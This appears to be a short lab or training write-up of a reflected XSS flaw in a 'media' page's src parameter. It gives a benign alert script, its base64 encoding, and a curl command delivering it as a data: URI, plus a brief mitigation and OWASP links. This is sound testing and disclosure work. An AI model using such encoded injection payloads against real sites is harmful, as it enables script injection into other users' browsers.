**Vulnerability: Client-side Resource Manipulation with Encoded Injection**

**Description:**
The media page contains unprotected endpoint that accepts arbitrary parameters that can result in injection of malicious strings, e.g. client-side code (JavaScript) that could lead to XSS vulnerabilities.

**Steps to Reproduce:**
```
http://<YOUR_IP_ADDRESS>/?page=media&src=
```
Encode malisious script 
```
<script>
  alert(‘XSS’);
</script>
```
to `base64` (tool: https://www.base64encode.net/) and pass it as `src` param:
```
curl -s -G 'http://localhost:8080/' \
  --data-urlencode 'page=media' \
  --data-urlencode 'src=data:text/html;base64,PHNjcmlwdD4NCiAgICBhbGVydCjigJhYU1PigJkpOw0KPC9zY3JpcHQ+'
```
This will trigger responses from the web browser that manifests the vulnerability. 

**Impact:**
1. Unprotected data entrypoint potentially resulting in an XSS attack.
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

**Mitigation:**
1. Sanitize inputs.

**References:**
https://github.com/OWASP/wstg/blob/63fbe5bfb3b93ba4f3edfb0bd02e75429a3be5ce/document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md
https://github.com/OWASP/wstg/blob/63fbe5bfb3b93ba4f3edfb0bd02e75429a3be5ce/document/6-Appendix/D-Encoded_Injection.md#hex-encoding
https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md 